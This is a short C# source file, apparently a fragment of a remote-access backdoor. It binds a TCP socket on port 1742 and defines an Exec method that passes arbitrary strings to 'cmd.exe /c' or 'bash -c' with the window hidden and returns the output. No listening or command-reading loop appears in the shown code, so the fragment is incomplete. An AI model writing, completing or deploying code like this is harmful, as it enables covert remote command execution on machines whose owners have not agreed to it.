using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
namespace steadystate;
class SKCS
{
    Socket stream;
#pragma warning disable CS8618 
    public SKCS(int port=1742)
  {    
       this.init(port);
    }

    public void init(int port)
    {
         IPHostEntry hosts = Dns.GetHostEntry(Dns.GetHostName());
    try{
        IPAddress ip =hosts.AddressList[1];
         IPEndPoint pEndPoint = new IPEndPoint(ip,port);
    
        this.stream=new Socket(pEndPoint.AddressFamily,SocketType.Stream,ProtocolType.Tcp);
        this.stream.Bind(pEndPoint);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex.Data);
        }
        
    }
    public string Exec(String command)
    {
        
       Process poc = new Process();
       if (OperatingSystem.IsWindows())
       {
        poc.StartInfo.FileName = "cmd.exe";
        poc.StartInfo.Arguments = "/c"+command;
        poc.StartInfo.UseShellExecute =false;
        poc.StartInfo.CreateNoWindow = true;
        poc.StartInfo.RedirectStandardOutput = true;
        poc.Start();

        string output = poc.StandardOutput.ReadToEnd();
            poc.WaitForExit();
            return output;
        }
           if (OperatingSystem.IsLinux())
       {
        poc.StartInfo.FileName = "/usr/bin/bash";
        poc.StartInfo.Arguments = "-c "+command;
        poc.StartInfo.UseShellExecute =false;
        poc.StartInfo.CreateNoWindow = true;
        poc.StartInfo.RedirectStandardOutput = true;
        poc.Start();

        string output = poc.StandardOutput.ReadToEnd();
            poc.WaitForExit();
            return output;
        }

        return "No Response";

    }


}